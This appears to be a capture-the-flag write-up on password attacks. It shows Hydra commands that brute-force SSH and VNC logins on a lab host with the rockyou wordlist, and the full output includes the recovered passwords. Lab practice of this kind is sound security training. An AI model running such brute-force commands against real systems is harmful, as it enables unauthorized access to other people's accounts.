---
title: Day 05 - Brute Force
desc: >-
  Day 5 covers topics related to brute-forcing passwords using Hydra in order to
  connect to remote services like SSH, RDP, and VNC.
---
## Introduction
Common attacks against passwords are presented below:

1. *Shoulder Surfing*: Observing and noting as a target inputs their credentials. This attack requires the least technical knowledge.

2. *Password Guessing*: People generally practice poor password practices by using personal details such as birth date or children's names as their passwords. Guessing the password of such users requires some knowledge of the target’s personal details.

3. *Dictionary Attack*: This approach expands on password guessing and attempts to include all valid words in a dictionary or a word list.

4. *Brute Force Attack*: This attack is the most exhaustive and time-consuming, where an attacker can try all possible character combinations.

Trying out `Hydra` example provided:

```console
┌──(siachen㉿kali)-[~/CyberSec/THM]
└─$ hydra -l alexander -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.232.4 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-05 09:20:43
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.232.4:22/
[22][ssh] host: 10.10.232.4   login: alexander   password: sakura
[STATUS] 14344398.00 tries/min, 14344398 tries in 00:01h, 1 to do in 00:01h, 9 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-05 09:21:51
```

## CTF Questions

Used Hydra to brute-force VNC password. 

!!! note
    VNC does not require a user name.

```console
┌──(siachen㉿kali)-[/dev/shm]
└─$ hydra -P /usr/share/wordlists/rockyou.txt 10.10.232.4 vnc
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-05 09:26:45
[WARNING] you should set the number of parallel task to 4 for vnc services.
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking vnc://10.10.232.4:5900/
[STATUS] 552.00 tries/min, 552 tries in 00:01h, 14343847 to do in 433:06h, 16 active
[5900][vnc] host: 10.10.232.4   password: 1q2w3e4r
[STATUS] attack finished for 10.10.232.4 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-05 09:29:10
```
Log-in to VNC using credentials found by Hydra. The flag is displayed on the desktop background image.